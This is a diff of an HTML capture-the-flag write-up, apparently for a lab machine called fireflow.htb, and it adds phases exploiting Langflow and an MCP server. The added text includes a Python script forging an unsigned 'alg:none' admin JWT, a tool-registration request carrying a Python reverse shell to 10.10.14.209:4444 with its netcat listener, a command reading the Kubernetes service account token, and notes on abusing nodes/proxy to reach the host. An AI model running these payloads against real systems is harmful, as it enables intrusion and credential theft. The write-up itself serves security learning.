+import base64, json
 
-      <pre><code>curl -s http://127.0.0.1:10248/healthz
-ok</code></pre>
+def b64url(obj):
+    return base64.urlsafe_b64encode(
+        json.dumps(obj, separators=(",", ":")).encode()
+    ).rstrip(b"=").decode()
 
-      <pre><code>curl -s http://127.0.0.1:10256/healthz</code></pre>
+header = {"alg": "none", "typ": "JWT"}
+payload = {"sub": "langflow-bot", "role": "admin"}
+print(b64url(header) + "." + b64url(payload) + ".")
+PY
+)</code></pre>
+        <pre><code>curl -i -X POST http://127.0.0.1:30080/api/v1/tools \
+  -H "Authorization: Bearer $ADMIN_TOKEN" \
+  -H "Content-Type: application/json" \
+  -d '{}'
 
-      <pre><code>{"nodeEligible":true,"healthy":true}</code></pre>
+HTTP/1.1 422 Unprocessable Entity
+missing fields: name, description, code</code></pre>
+      </section>
 
-      <p>
-        The default Kubernetes service account path did not appear to contain a mounted token for
-        the current process.
-      </p>
+      <section>
+        <h2>Phase 6: MCP Tool Registration and RCE Path</h2>
+        <h3>Tool Registration Schema</h3>
+        <p>
+          The OpenAPI schema showed that <code>POST /api/v1/tools</code> accepts
+          <code>name</code>, <code>description</code>, optional <code>inputSchema</code>, and
+          <code>code</code>.
+        </p>
+        <pre><code>ToolRegisterRequest:
+  required: name, description, code
+  optional: inputSchema</code></pre>
 
-      <pre><code>ls -la /var/run/secrets/kubernetes.io/serviceaccount 2&gt;/dev/null</code></pre>
+        <h3>Observed Testing</h3>
+        <p>
+          Initial tools were registered successfully and appeared in <code>tools/list</code>, but
+          tools written as <code>def run()</code> returned blank output and produced no side effects.
+          This matched the external reference: the working payload should place Python directly in
+          the top-level <code>code</code> field and detach the reverse shell using
+          <code>subprocess.Popen</code>.
+        </p>
+        <pre><code>curl -s -X POST http://127.0.0.1:30080/mcp \
+  -H "Authorization: Bearer $ADMIN_TOKEN" \
+  -H "Content-Type: application/json" \
+  -d '{"jsonrpc":"2.0","id":20,"method":"tools/list","params":{}}'</code></pre>
 
-      <pre><code>No output</code></pre>
+        <div class="callout success">
+          <strong>Next Exploitation Step:</strong> Register a top-level Python payload that starts a
+          detached reverse shell process, then invoke it through the MCP JSON-RPC endpoint.
+        </div>
+        <pre><code># Attacker box
+nc -lvnp 4444
 
-      <h2>Current Status</h2>
-      <p>
-        Initial access has been achieved as <code>www-data</code>. The next goal is to find a path to
-        the <code>nightfall</code> user or a Kubernetes/Langflow credential that allows further access.
-      </p>
+# Target: register detached MCP reverse shell tool
+curl -i -X POST http://127.0.0.1:30080/api/v1/tools \
+  -H "Authorization: Bearer $ADMIN_TOKEN" \
+  -H "Content-Type: application/json" \
+  -d '{
+    "name":"pwn2",
+    "description":"detached reverse shell test",
+    "inputSchema":{},
+    "code":"import subprocess,os,sys;subprocess.Popen([\"python3\",\"-c\",\"import socket,subprocess,os,pty;s=socket.socket();s.connect((\\\"10.10.14.209\\\",4444));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn(\\\"/bin/bash\\\")\"],stdout=subprocess.DEVNULL,stderr=subprocess.DEVNULL);print(\"shell spawned\")"
+  }'
 
-      <h2>Next Steps</h2>
-      <ul>
-        <li>Run and review LinPEAS output from the <code>www-data</code> shell.</li>
-        <li>Search for API keys that can access the local Langflow MCP endpoint.</li>
-        <li>Investigate <code>langflow.db</code> and any other database files.</li>
-        <li>Look for kubeconfigs, Kubernetes service account tokens, or readable certificates.</li>
-        <li>Check for SUID binaries, writable services, cron jobs, and interesting capabilities.</li>
-        <li>Find a way to access the <code>nightfall</code> user account and retrieve <code>user.txt</code>.</li>
-      </ul>
+# Target: invoke tool
+curl -s -X POST http://127.0.0.1:30080/mcp \
+  -H "Authorization: Bearer $ADMIN_TOKEN" \
+  -H "Content-Type: application/json" \
+  -d '{
+    "jsonrpc":"2.0",
+    "id":1,
+    "method":"tools/call",
+    "params":{"name":"pwn2","arguments":{}}
+  }'</code></pre>
+      </section>
 
-      <h2>Tools Used</h2>
-      <ul>
-        <li>Nmap</li>
-        <li>curl</li>
-        <li>Gobuster</li>
-        <li>WhatWeb</li>
-        <li>Browser Developer Tools</li>
-        <li>Python</li>
-        <li>Netcat</li>
-        <li>SQLite3</li>
-        <li>ss</li>
-        <li>LinPEAS</li>
-      </ul>
+      <section>
+        <h2>Phase 7: Kubernetes Privilege Escalation Path</h2>
+        <p>
+          The MCP process was observed running as <code>nightfall</code> under
+          <code>uvicorn main:app</code>, while Kubernetes artifacts confirmed a pod named
+          <code>mcp-server</code>. The expected next step is to obtain a shell inside the MCP pod,
+          then read the pod service account token.
+        </p>
+        <pre><code>ps auxww | grep -iE '30080|mcp|uvicorn|python' | grep -v grep
+find / -iname '*mcp*' -o -iname '*registry*' 2&gt;/dev/null | head -100</code></pre>
+        <pre><code>/var/log/containers/mcp-server-54464cb475-29ztf_default_...</code></pre>
 
-      <h2>Lessons Learned</h2>
-      <p>
-        This machine reinforced the importance of inspecting browser network traffic when a web
-        application hides important behavior behind a frontend. Directory brute forcing alone was
-        not enough; the key discovery came from the POST request generated by the Langflow
-        playground.
-      </p>
+        <h3>Service Account Token Checks</h3>
+        <pre><code>cat /var/run/secrets/kubernetes.io/serviceaccount/token
+env | grep KUBERNETES
+TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)</code></pre>
 
-      <p>
-        I also learned the difference between a stable <code>flow_id</code> and a per-run
-        <code>job_id</code>. The <code>flow_id</code> identifies the Langflow graph to run, while the
-        <code>job_id</code> identifies one specific execution and is used to fetch output from the
-        <code>/events</code> endpoint.
-      </p>
+        <h3>RBAC Review</h3>
+        <p>
+          The external writeup indicates the key permission is <code>nodes/proxy</code>. If present,
+          the service account can talk to the kubelet through the API server and execute commands
+          in pods running on the node.
+        </p>
+        <pre><code>curl -sk \
+  -H "Authorization: Bearer $TOKEN" \
+  -H "Content-Type: application/json" \
+  https://$KUBERNETES_SERVICE_HOST:$KUBERNETES_SERVICE_PORT/apis/authorization.k8s.io/v1/selfsubjectrulesreviews \
+  -d '{
+    "kind":"SelfSubjectRulesReview",
+    "apiVersion":"authorization.k8s.io/v1",
+    "spec":{"namespace":"default"}
+  }'</code></pre>
 
-      <p>
-        Finally, the foothold showed how application-level RCE can lead into broader host and
-        cluster enumeration. After gaining a shell as <code>www-data</code>, local services revealed
-        Kubernetes components and internal Langflow/MCP functionality that were not directly
-        accessible from the outside.
-      </p>
+        <h3>Expected Root Path</h3>
+        <p>
+          With <code>nodes/proxy</code>, enumerate pods through the kubelet and target a privileged
+          monitoring pod such as <code>prometheus-prometheus-node-exporter</code>. Node exporter
+          commonly mounts the host filesystem under <code>/host/root</code>, making the host root
+          flag readable from inside the pod.
+        </p>
+        <pre><code># Example expected final path
+/host/root/root/root.txt</code></pre>
+      </section>
 
-      <h2>Flags</h2>
-      <pre><code>user.txt: Not yet obtained
-root.txt: Not yet obtained</code></pre>
+      <section>
+        <h2>Attack Chain</h2>
+        <ol>
+          <li>Discovered HTTPS service and vhost <code>fireflow.htb</code>.</li>
+          <li>Found public Langflow playground on <code>flow.fireflow.htb</code>.</li>
+          <li>Identified Langflow <code>1.8.2</code> and vulnerable public flow build behavior.</li>
+          <li>Modified flow component code to prove RCE as <code>www-data</code>.</li>
+          <li>Obtained reverse shell as <code>www-data</code>.</li>
+          <li>Used LinPEAS to find Langflow superuser credentials in environment variables.</li>
+          <li>Reused the password to SSH as <code>nightfall</code> and captured <code>user.txt</code>.</li>
+          <li>Found <code>~/.mcp/config.json</code> with MCP service credentials.</li>
+          <li>Authenticated to MCP and discovered JWT support for <code>HS256</code> and <code>none</code>.</li>
+          <li>Forged unsigned JWT with <code>role=admin</code>.</li>
+          <li>Registered admin MCP tools and identified detached top-level Python as the working RCE pattern.</li>
+          <li>Next: spawn MCP pod shell, use Kubernetes service account token, abuse <code>nodes/proxy</code>, and read root via node-exporter host mount.</li>
+        </ol>
+      </section>
 
-      <p><a href="../index.html">Back to all reports</a></p>
+      <section>
+        <h2>Tools Used</h2>
+        <ul>
+          <li>Nmap</li>
+          <li>curl</li>
+          <li>WhatWeb</li>
+          <li>Gobuster</li>
+          <li>Burp Suite / Browser DevTools</li>
+          <li>Python</li>
+          <li>Netcat</li>
+          <li>LinPEAS</li>
+          <li>SSH</li>
+          <li>OpenAPI / Swagger</li>
+          <li>JWT forgery script</li>
+          <li>Kubernetes API / kubelet nodes/proxy path</li>
+        </ul>
+      </section>
 
+      <section>
+        <h2>Lessons Learned</h2>
+        <ul>
+          <li>Certificate SANs and vhost hints can reveal the real application surface.</li>
+          <li>Public AI workflow endpoints should be treated as high-risk if they accept custom code or dynamic components.</li>
+          <li>Environment variables frequently contain service credentials and should be reviewed after obtaining a service-account shell.</li>
+          <li>Password reuse between application accounts and Linux users can turn app compromise into SSH access.</li>
+          <li>JWT implementations must never accept <code>alg:none</code>.</li>
+          <li>Tool registration APIs that accept arbitrary code are effectively remote execution primitives.</li>
+          <li>Kubernetes <code>nodes/proxy</code> permission can be extremely dangerous, especially when privileged monitoring pods mount the host filesystem.</li>
+        </ul>
+      </section>
+
+      <section>
+        <h2>Flags</h2>
+        <pre><code>user.txt: REDACTED
+root.txt: Pending</code></pre>
+      </section>
+
+      <footer>
+        <p><a href="../index.html">Back to all reports</a></p>
+      </footer>
     </main>
   </body>
 </html>
